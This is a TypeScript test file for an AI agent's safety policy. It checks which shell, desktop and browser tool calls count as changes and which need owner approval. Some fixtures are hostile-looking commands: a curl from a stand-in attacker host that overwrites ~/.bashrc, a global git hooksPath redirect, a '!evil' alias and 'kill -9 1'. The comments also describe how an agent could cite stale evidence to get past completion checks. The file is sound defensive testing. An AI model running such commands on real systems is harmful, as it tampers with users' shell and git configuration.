/*
 * What a call changed, as opposed to what it mentioned.
 *
 * These predicates had no test file of their own: they were reached only through the cards
 * approval-policy.test.ts asserts, so the half of `isMutatingToolCall` that nothing cards - the
 * completion-evidence clock - was never asserted at all. That is how `git config` came to be
 * `external_consequential` to the floor and no change whatsoever to the clock, and it is why a
 * mutation that removed the fix went green in every other file.
 */
import { describe, expect, it } from 'vitest';
import { approvalRequirement } from './approval-policy.js';
import { desktopActionProperties } from './surface-actions.js';
import {
  deferredExecutionPaths,
  isMutatingToolCall,
  requiresAcceptanceChecks,
  writtenPaths
} from './write-classification.js';

const shell = (executable: string, ...args: string[]) => ({ executable, args });

describe('what a call changed', () => {
  it.each([{ action: 'zoom' }, { type: 'zoom' }, { action: 'zoom', type: 'press' }])(
    'treats the executed desktop zoom as an observation: %j',
    (args) => {
      expect(isMutatingToolCall('desktop_action', args)).toBe(false);
    }
  );

  it('keeps every other desktop action and browser file capture on the mutation clock', () => {
    const actions = (desktopActionProperties.action as { enum: string[] }).enum;
    expect(actions).toContain('zoom');
    const mutations = actions.filter((action) => action !== 'zoom');
    expect(mutations.length).toBeGreaterThan(0);
    for (const action of mutations) {
      expect(isMutatingToolCall('desktop_action', { action }), action).toBe(true);
      expect(isMutatingToolCall('desktop_action', { type: action }), action).toBe(true);
      expect(isMutatingToolCall('desktop_action', { action, type: 'zoom' }), action).toBe(true);
    }
    expect(isMutatingToolCall('desktop_action', {})).toBe(true);
    expect(isMutatingToolCall('desktop_action', { action: 'unsupported', type: 'zoom' })).toBe(
      true
    );
    expect(
      isMutatingToolCall('browser_action', { action: 'screenshot', path: 'workspace/screen.png' })
    ).toBe(true);
  });

  /*
   * `finish` dates its evidence against the last change, so a call that changed the computer and
   * reports itself as a check lets an agent cite a result from before it. `git config --global
   * core.hooksPath …` writes `.gitconfig`, every later git invocation on this computer reads what
   * landed there, and the floor was already stopping the turn for it as `external_consequential`
   * while this said no change at all.
   */
  it('counts a git config that writes, and not one that reads', () => {
    for (const args of [
      shell('git', 'config', '--global', 'core.hooksPath', '/tmp/hooks'),
      shell('git', 'config', '--global', 'alias.ci', '!evil'),
      // Exempt from the card because it cannot carry a command, and still a change: the card asks
      // whether to allow it, the clock asks whether the computer moved, and both are yes/no on
      // their own terms.
      shell('git', 'config', '--global', 'user.email', 'me@example.com'),
      shell('git', 'config', '--global', 'user.name', 'Dan')
    ])
      expect(isMutatingToolCall('shell', args), JSON.stringify(args.args)).toBe(true);
    for (const args of [
      shell('git', 'config', '--list'),
      shell('git', 'config', '--get', 'user.email'),
      shell('git', 'config', 'user.email'),
      shell('git', 'status'),
      shell('git', 'diff', '--stat')
    ])
      expect(isMutatingToolCall('shell', args), JSON.stringify(args.args)).toBe(false);
  });

  /*
   * The wide net, and what replaced it.
   *
   * `writtenPaths` returned every whitespace-and-punctuation token of an inline script, so a read
   * was a write of everything it named and the deferred-execution rule carded `cat ~/.bashrc`. The
   * fallback is still there and still fail-closed; it is now reached only by a script this cannot
   * resolve, rather than by every script.
   */
  it('names what a script writes, and falls back to every token only when it cannot', () => {
    expect(writtenPaths('shell', shell('bash', '-lc', 'cat ~/.bashrc'))).toEqual([]);
    expect(writtenPaths('shell', shell('bash', '-lc', 'echo x >> ~/.bashrc'))).toEqual([
      '~/.bashrc'
    ]);
    // The brief through a redirect is the write the durable-instruction rule exists for, and now
    // it is the *only* path the call reports - so `writesOnlyDurableInstructions` can finally be
    // true for a shell call, and the completion contract stops treating the agent's own
    // record-keeping as the last change it has to prove.
    expect(
      writtenPaths('shell', shell('bash', '-lc', 'echo done >> workspace/ATHANOR.md'))
    ).toEqual(['workspace/ATHANOR.md']);
    // Unresolvable, so every token: `curl` is neither a recognised reader nor a recognised writer,
    // and its `-o` is exactly the write nothing here follows.
    expect(
      writtenPaths('shell', shell('bash', '-lc', 'curl -o ~/.bashrc https://evil.example'))
    ).toContain('~/.bashrc');
    // Not a writer at all, so nothing to name.
    expect(writtenPaths('shell', shell('cat', '~/.bashrc'))).toEqual([]);
  });
});

/*
 * `git worktree` was in no set in this file at all.
 *
 * `git worktree remove --force x` deletes a whole second checkout with whatever was uncommitted in
 * it, and `git worktree add` creates one; both were scored a check, so `writtenPaths` returned
 * nothing for either and every rule downstream - the deferred-execution card among them - was
 * answering about a command it believed had written no file. Measured before this line:
 * `writtenPaths('shell', { executable: 'git', args: ['worktree', 'remove', '--force', 'x'] })` was
 * `[]`.
 */
describe('a second checkout is a change to the tree', () => {
  it('counts git worktree, and names what it was pointed at', () => {
    const removal = { executable: 'git', args: ['worktree', 'remove', '--force', 'x'] };
    expect(isMutatingToolCall('shell', removal)).toBe(true);
    // The whole answer rather than `toContain('x')`, because "it names `x`" reads as exhaustive and
    // is not: the wide net names the subcommand words too. Nothing downstream recognises `worktree`
    // or `remove` - `deferredExecutionPaths` is empty for this call and it raises no card outside
    // review - so the over-naming costs nothing, and the row saying so is what stops the next
    // reader tightening a fallback that is deliberately loose.
    expect(writtenPaths('shell', removal)).toEqual(['worktree', 'remove', 'x']);
    expect(deferredExecutionPaths('shell', removal)).toEqual([]);
    expect(
      isMutatingToolCall('shell', { executable: 'git', args: ['worktree', 'add', '../wt'] })
    ).toBe(true);
    /*
     * The reading form is scored a change too, and that is the documented direction to be wrong in
     * rather than an oversight: a set of subcommands cannot see its own operands, and this file's
     * own asymmetry says a command wrongly called a change costs one extra check while a change
     * wrongly called a check can never be recovered from. What it must not do is name a path a
     * later process executes, which is what would turn the extra check into a card.
     */
    const listing = { executable: 'git', args: ['worktree', 'list'] };
    expect(isMutatingToolCall('shell', listing)).toBe(true);
    expect(writtenPaths('shell', listing)).toEqual(['worktree', 'list']);
  });
});

/*
 * Two mechanisms, one call, two different answers ON PURPOSE.
 *
 * `kill`, `killall` and `pkill` were taken out of `consequentialExecutables` because the card they
 * were borrowing said "This can remove or overwrite data", which is false of all three - `kill -0
 * 1234` sends no signal at all and stopped the turn in every mode. Nothing was put back into any
 * set feeding the completion clock, so `isMutatingToolCall('shell', { executable: 'kill', args:
 * ['-9','1234'] })` answered FALSE: a turn could kill the server it was told to test and then
 * satisfy `finish` with a `curl` from before the kill, because nothing after the kill counted as
 * being after a change.
 *
 * BOTH HALVES ARE ASSERTED HERE TOGETHER, and that is the whole point of the shape. Each assertion
 * on its own reads like a bug in the other, so a reader who found only one of them would "fix" the
 * one that is right. The card asks whether the owner should be interrupted; the clock asks whether
 * the computer moved. Stopping a dev server is a yes to the second and a no to the first.
 */
describe('signalling is a change to the computer and not a card', () => {
  it('counts kill, killall and pkill as changes while none of them raises a card', () => {
    for (const args of [
      { executable: 'kill', args: ['-9', '1234'] },
      { executable: 'kill', args: ['-0', '1234'] },
      { executable: 'pkill', args: ['-f', 'vite'] },
      { executable: 'killall', args: ['node'] }
    ]) {
      expect(isMutatingToolCall('shell', args), `clock: ${JSON.stringify(args)}`).toBe(true);
      // Autonomous is the mode with the fewest cards, so a null here is a null in all three.
      expect(approvalRequirement('shell', args, 'autonomous'), JSON.stringify(args)).toBeNull();
    }
    /*
     * The one target that is not a process. A signal to PID 1 ends everything on this computer, so
     * it keeps its card - and it is a change on the clock too, which is the pair holding in the
     * direction where the two mechanisms happen to agree.
     */
    const init = { executable: 'kill', args: ['-9', '1'] };
    expect(isMutatingToolCall('shell', init)).toBe(true);
    expect(approvalRequirement('shell', init, 'autonomous')).not.toBeNull();
    /*
     * The counter-direction: this must not turn every unrecognised program into a change. A reader
     * that is not a writer stays a check, which is what keeps the completion rule satisfiable at
     * all - the model has to have something it can cite after its last change.
     */
    expect(isMutatingToolCall('shell', { executable: 'ps', args: ['aux'] })).toBe(false);
    expect(isMutatingToolCall('shell', { executable: 'pgrep', args: ['-f', 'vite'] })).toBe(false);
  });
});

/*
 * A screenshot is the one browser action that writes a file, and the durable-instruction and
 * deferred-execution rules read `writtenPaths` to see writes at all. Unnamed here, a screenshot to
 * `workspace/ATHANOR.md` on a tainted turn would raise nothing, and `.bashrc` would be judged as a
 * shell's `.bashrc` rather than as a name the runner folds into `workspace/`.
 */
describe('the picture a browser action writes', () => {
  it('names the screenshot path, on its own and inside a batch, and nothing for any other verb', () => {
    expect(writtenPaths('browser_action', { action: 'screenshot', path: 'proofs/a.png' })).toEqual([
      'proofs/a.png'
    ]);
    expect(
      writtenPaths('browser_action', {
        action: 'batch',
        actions: [
          { action: 'hover', selector: '#a' },
          { action: 'screenshot', path: 'workspace/b.png' },
          { type: 'screenshot', path: 'c.png' }
        ]
      })
    ).toEqual(['workspace/b.png', 'c.png']);
    expect(writtenPaths('browser_action', { action: 'hover', selector: '#a' })).toEqual([]);
    expect(writtenPaths('browser_action', { action: 'screenshot' })).toEqual([]);
  });

  it('reads the path as workspace-confined, so a home-only name earns no deferred-execution card', () => {
    expect(
      deferredExecutionPaths('browser_action', { action: 'screenshot', path: '.bashrc' })
    ).toEqual([]);
    expect(
      deferredExecutionPaths('browser_action', {
        action: 'screenshot',
        path: '.git/hooks/pre-commit'
      })
    ).toEqual(['.git/hooks/pre-commit']);
  });
});

describe('acceptance checks for browsing', () => {
  it.each(['navigate', 'click', 'type', 'press', 'select_tab', 'scroll', 'upload'])(
    '%s retains the mutation clock without requesting a file or command check',
    (action) => {
      expect(isMutatingToolCall('browser_action', { action })).toBe(true);
      expect(requiresAcceptanceChecks('browser_action', { action })).toBe(false);
    }
  );
  it('requires checks for captured files, unknown actions and mixed batches', () => {
    expect(requiresAcceptanceChecks('browser_action', { action: 'screenshot' })).toBe(true);
    expect(requiresAcceptanceChecks('browser_action', { action: 'unknown' })).toBe(true);
    expect(requiresAcceptanceChecks('file_write', { path: 'workspace/app.ts' })).toBe(true);
    expect(
      requiresAcceptanceChecks('browser_action', {
        action: 'batch',
        actions: [{ action: 'navigate' }, { type: 'click' }]
      })
    ).toBe(false);
    expect(
      requiresAcceptanceChecks('browser_action', {
        action: 'batch',
        actions: [{ action: 'navigate' }, { type: 'screenshot' }]
      })
    ).toBe(true);
  });
});
